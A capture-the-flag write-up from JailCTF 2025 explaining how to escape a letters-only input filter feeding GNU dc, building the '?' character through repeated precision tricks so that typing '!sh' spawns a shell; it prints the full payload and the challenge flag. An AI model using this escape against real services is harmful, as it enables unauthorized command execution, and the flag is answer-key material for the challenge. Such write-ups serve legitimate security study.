---
layout: writeup
parent: JailCTF 2025
tags: ["misc"]
---
<h1>{{ page.title | downcase }} {% for tag in page.tags %}<span class="category-tag">{{ tag }}</span>{% endfor %}</h1>
```
a "desk calculator" ... using "reverse polish notation" ... yeah this was not on my bucket list for year
```

chal.py:
```python
#!/usr/bin/python3

import os

inp = input('> ')
if any(c not in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy' for c in inp):  # they gave me no blue raspberry dawg
    print('bad. dont even try using lowercase z')
    exit(1)

with open('/tmp/code.txt', 'w') as f:
    f.write(inp)

os.system(f'/usr/bin/dc -f /tmp/code.txt')

print("stop. you're done. get out.")
```

## dc?

The core of this challenge lies within gaining RCE access within `dc`, a GNU "desk calculator" preinstalled on many linux systems.

In initial observation of [the manpage](https://www.gnu.org/software/bc/manual/dc-1.05/html_mono/dc.html), we can see that dc has a variety of commands that surround the modification of its two native types, integers and strings. Given the limited charset given by the challenge, we are restricted to certain commands within `dc`.

## The attack
Some notable commands are:
```
       x      Pops a value off the stack and executes it as a macro.  Normally it should  be
              a string; if it is a number, it is simply pushed back onto the stack.  For ex‐
              ample, [1p]x executes the macro 1p which pushes 1 on the stack and prints 1 on
              a separate line.

       ?      Reads  a  line from the terminal and executes it.  This command allows a macro
              to request input from the user.

       O      Pushes the current output radix on the stack.

       k      Pops the value off the top of the stack and uses it to set the precision.

       v      Pops one value, computes its square root, and pushes that. The precision
              value specifies the number of fraction digits in the result.

       Z      Pops a value off the stack, calculates the number of digits it has (or number
              of characters, if it is a string) and pushes that number.

       a      The mnemonic for this is somewhat erroneous: asciify. The top-of-stack is popped.
              If it was a number, then the low-order byte of this number is converted into a
              string and pushed onto the stack. Otherwise the top-of-stack was a string, and
              the first character of that string is pushed back. (This command is a GNU
              extension.)
```

### Method
The end goal is to be able to execute `sh`, which without the charset restriction can be ran with `!sh`. In order to get to this point, we can use the `?` command to manually input `!sh`. However, since `?` is also not in our charset, we can use `a` to convert an integer value to the char `?`. Since we cannot use integers or most arithmetic operators, the general approach is:

1. Start with `O` which by default the output radix is set to 10. This will push the value 10 onto the stack
2. Run `k` which will change the precision from 0->10
3. From here, we can run `O` to push 10 again, `v` to compute the square root, `Z` to calculate the number of digits (which will always be the current precision + 1 for the integer part) then `k` again. Each iteration of `OvZk` will increment the precision by one, which we can use to create an arbitrary number larger than 10. In our case, the `?` character has ASCII code of 63, so we run `OvZk` 52 times
4. Once the value on the stack is the integer 63, we can run `a` to convert it to the string `?` and then `x` to execute it
5. `x` will execute the string `?` which we can then manually input `!sh` (or really anything at this point) and get the flag

### Payload
`Ok` + `OvZk`*52 + `OvZax` = `OkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZkOvZax`

After running payload, manually input `!sh`

`jail{but_does_your_desk_calculator_have_rce?_5c9cff7b71fc447d}
`